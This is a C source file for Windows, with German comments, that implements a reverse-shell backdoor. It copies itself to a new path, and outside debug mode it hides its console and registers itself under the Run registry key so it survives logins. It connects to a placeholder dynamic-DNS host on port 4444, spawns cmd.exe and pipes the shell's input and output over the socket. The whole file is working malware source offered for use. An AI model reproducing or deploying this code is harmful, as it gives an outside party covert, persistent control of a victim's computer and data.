#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <stdio.h> 
#include <direct.h>
#include <stdlib.h>

#pragma comment( lib, "ws2_32.lib" )

#define BUFSIZE 4096
#define DEBUG 1

HANDLE g_hChildStd_IN_Rd = NULL;
HANDLE g_hChildStd_IN_Wr = NULL;
HANDLE g_hChildStd_OUT_Rd = NULL;
HANDLE g_hChildStd_OUT_Wr = NULL;

SOCKET sock;
BOOLEAN exitOnForce = FALSE;

//Prototypen
int StartWinsock(void);
long getAddrFromString(char*, SOCKADDR_IN*);
void CreateChildProcess(void); 
void WriteToPipe(void); 
void ReadFromPipe(void); 
void ErrorExit(PTSTR); 

int main(int argc, char** argv)
{
	char dyndns[] ="www.youradress.com";

	//Get the CWD and append the new Filename for the Copy-Method of the exe itself.
	//Note: Ugly one... leave it in his dark place alone and hope it will die someday..
	char * buffer;
	buffer = _getcwd(NULL, 0);
	int counter =0;

	for(int i = 0;;i++)
	{
		if(counter == 2)
		{
			if(buffer[i] == '\\' || buffer[i] == '>')
			{
				buffer[i] = 0;
				break;
			}
		}

		if(buffer[i]=='\\')
		{
			counter++;
		}
	}
	strcat(buffer,"\\yourfilename.exe");

	CopyFileA(argv[0],buffer,false);
		

#if !DEBUG
	//Hideing the console window

	HWND hWnd = GetConsoleWindow();
	ShowWindow( hWnd, SW_HIDE );

	//Setting the console name for fun and profit
	//char name[]="SPARTA";
	//SetConsoleTitleA(name);

	char subkey[]= "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

	//char cwd[1024];
	//char asf[] = "lolololol";
	//_getcwd(cwd,1024);
	//strcat(cwd,"\\");
	//strcpy(cwd,**argv);
	//strcat(cwd,argv[0]);

	DWORD shit=0;
	RegSetValueA(HKEY_CURRENT_USER,subkey,REG_SZ, buffer, shit);
#endif

	//Testausgabe
#if DEBUG
	printf("Socket Client\n");
#endif

	//Variablen initialisieren
	long returnvalue;
	SOCKADDR_IN addr;
	SECURITY_ATTRIBUTES saAttr;

#if DEBUG
	printf("\n->Start of parent execution.\n");
#endif

	// Set the bInheritHandle flag so pipe handles are inherited. 

	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); 
	saAttr.bInheritHandle = TRUE; 
	saAttr.lpSecurityDescriptor = NULL; 

	// Create a pipe for the child process's STDOUT. 

	if ( ! CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0) ) 
		exit(2); 

	// Ensure the read handle to the pipe for STDOUT is not inherited.

	if ( ! SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0) )
		exit(3); 

	// Create a pipe for the child process's STDIN. 

	if (! CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0)) 
		exit(4); 

	// Ensure the write handle to the pipe for STDIN is not inherited. 

	if ( ! SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0) )
		exit(5); 

	// Create the child process. 

	CreateChildProcess();

	//Weitere SOCKET Abhandlungen...

	//Socket Verfügbarkeit prüfen
	do
	{
		returnvalue = StartWinsock();
		if(returnvalue != 0)
		{
#if DEBUG
			printf("[-] Fehler: StartWinsock Fehlercode: %d!\n",returnvalue);
#endif
			Sleep(60000);
		}
#if DEBUG
		else
		{
			printf("[+] Winsock gestartet!\n");
		}
#endif
	}
	while(returnvalue != 0);

	//Socket initialisieren
	do
	{
		sock = socket(AF_INET,SOCK_STREAM,0);
		if(sock == INVALID_SOCKET)
		{
#if DEBUG
			printf("[-] Fehler: Der Socket konnte nicht erstellt werden, fehler code: %d\n",WSAGetLastError());
#endif
			Sleep(60000);
		}
#if DEBUG
		else
		{
			printf("[+] Socket erstellt!\n");
		}
#endif
	}
	while(sock == INVALID_SOCKET);

	//Port und IP übergabe
	memset(&addr,0,sizeof(SOCKADDR_IN));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(4444);
	//addr.sin_addr.s_addr = inet_addr("127.0.0.1");

	do
	{
		returnvalue = getAddrFromString(dyndns,&addr);
		if(returnvalue == SOCKET_ERROR)
		{
#if DEBUG
		printf("[-] Fehler: IP für %s konnte nicht aufgeloest werden.\n");
#endif
		Sleep(60000);
		}
#if DEBUG
		else
		{
		printf("[+] IP aufgelöst!\n");
		}
#endif
	}
	while(returnvalue == SOCKET_ERROR);

	//Verbindungsaufbau
	do
	{
		returnvalue = connect(sock, (SOCKADDR*)&addr, sizeof(SOCKADDR));
		if(returnvalue == SOCKET_ERROR)
		{
#if DEBUG
			printf("[-] Fehler: connect gescheitert, fehler code: %d\n",WSAGetLastError());
#endif
			Sleep(60000);
		}
#if DEBUG
		else
		{
			printf("[+] Verbindung hergestellt mit %s\n",argv[1]);
		}
#endif
	}
	while(returnvalue == SOCKET_ERROR);

	for(;;)
	{
#if DEBUG
		//Warten auf Input
		printf("[-] Warte auf Input ...\n\n");
#endif

		WriteToPipe(); 

		ReadFromPipe();

		if(exitOnForce)
		{
#if DEBUG
			printf("\n->SYSTEM GOING DOWN!\n");
#endif
			break;
		}
	}
#if DEBUG
	printf("\n->End of parent execution.\n");
#endif

	// The remaining open handles are cleaned up when this process terminates. 
	// To avoid resource leaks in a larger application, close handles explicitly. 

	return 0;
}

int StartWinsock()
{
	WSADATA wsa;
	return WSAStartup(MAKEWORD(2,0),&wsa);
}

long getAddrFromString(char* hostnameOrIp, SOCKADDR_IN* addr)
{
	unsigned long ip;
	HOSTENT* hoststruct;

	/* Parameter prüfen */
	if(hostnameOrIp==NULL || addr==NULL)
	{
		return SOCKET_ERROR;
	}

	/* eine IP in hostnameOrIp ? */
	ip=inet_addr(hostnameOrIp);
	/* bei einem fehler liefert inet_addr den Rückgabewert INADDR_NONE */
	if(ip!=INADDR_NONE)
	{
		addr->sin_addr.s_addr=ip;
		return 0;
	}
	else
	{
		/* Hostname in hostnameOrIp auflösen */
		hoststruct=gethostbyname(hostnameOrIp);
		if(hoststruct==NULL)
		{
			return SOCKET_ERROR;
		}
		else
		{
			/*die 4 Bytes der IP von he nach addr kopieren */
			memcpy(&(addr->sin_addr),hoststruct->h_addr_list[0],4);
		}
		return 0;
	}
}


//--------------------------------------------------------------------------------------------------------------

void CreateChildProcess()
	// Create a child process that uses the previously created pipes for STDIN and STDOUT.
{ 
	TCHAR szCmdline[]=TEXT("cmd");
	STARTUPINFO siStartInfo;
	PROCESS_INFORMATION piProcInfo; 
	BOOL bSuccess = FALSE; 

	// Set up members of the PROCESS_INFORMATION structure. 

	ZeroMemory( &piProcInfo, sizeof(PROCESS_INFORMATION) );

	// Set up members of the STARTUPINFO structure. 
	// This structure specifies the STDIN and STDOUT handles for redirection.

	ZeroMemory( &siStartInfo, sizeof(STARTUPINFO) );
	siStartInfo.cb = sizeof(STARTUPINFO); 
	siStartInfo.hStdError = g_hChildStd_OUT_Wr;
	siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
	siStartInfo.hStdInput = g_hChildStd_IN_Rd;
	siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

	// Create the child process. 

	bSuccess = CreateProcess(NULL, 
		szCmdline,     // command line 
		NULL,          // process security attributes 
		NULL,          // primary thread security attributes 
		TRUE,          // handles are inherited 
		0,             // creation flags 
		NULL,          // use parent's environment 
		NULL,          // use parent's current directory 
		&siStartInfo,  // STARTUPINFO pointer 
		&piProcInfo);  // receives PROCESS_INFORMATION 

	// If an error occurs, exit the application. 
	if ( ! bSuccess ) 
		exit(11);
	else 
	{
		// Close handles to the child process and its primary thread.
		// Some applications might keep these handles to monitor the status
		// of the child process, for example. 

		CloseHandle(piProcInfo.hProcess);
		CloseHandle(piProcInfo.hThread);
	}
}

void WriteToPipe(void) 

	// Read from a file and write its contents to the pipe for the child's STDIN.
	// Stop when there is no more data. 
{ 
	DWORD dwRead=0, dwWritten=0; 
	CHAR chBuf[BUFSIZE];
	BOOL bSuccess = FALSE;
	long returnvalue=0;

	memset(chBuf, 0, BUFSIZE);

	OVERLAPPED ovl = {0};

	BOOL succeed = ReadFile((HANDLE)sock, chBuf, BUFSIZE, &dwRead, &ovl);

	if (!succeed)
	{
		DWORD err = GetLastError();
		if (ERROR_IO_PENDING == err) {
			if (!GetOverlappedResult((HANDLE)sock, &ovl, (LPDWORD)&returnvalue, TRUE))
			{
				returnvalue = SOCKET_ERROR;
#if DEBUG
				printf("Overlapped I/O failed");
#endif
			}
		}
		else
		{
			returnvalue = SOCKET_ERROR;
#if DEBUG
			printf("ReadFile failed with last error %d\n", err);
#endif
		}
	} 


	for(int i = 0; i < BUFSIZE; i ++)
	{
		if(chBuf[i] == 0)
		{
			dwRead=i;
			break;
		}
	}

#if DEBUG
	printf("\n%s -> chBuf\n", &chBuf);
#endif

	if(dwRead==0)
	{
		dwRead=BUFSIZE-1;
	}

	bSuccess = WriteFile(g_hChildStd_IN_Wr, chBuf, dwRead, &dwWritten, NULL);

	if((strcmp("###exitshell\n",chBuf))==0)
	{
		exitOnForce=TRUE;
	}
} 

void ReadFromPipe(void) 

	// Read output from the child process's pipe for STDOUT
	// and write to the parent process's pipe for STDOUT. 
	// Stop when there is no more data. 
{ 
	DWORD dwRead=0, dwWritten=0, dwTemp=0; 
	CHAR chBuf[BUFSIZE]; 
	BOOL bSuccess = FALSE;
	long returnvalue=0;
	OVERLAPPED ovl = {0};

	memset(chBuf, 0, BUFSIZE);

	bSuccess = ReadFile(g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, &ovl);

	bSuccess = WriteFile((HANDLE) sock, chBuf, dwRead, &dwWritten,&ovl);
} 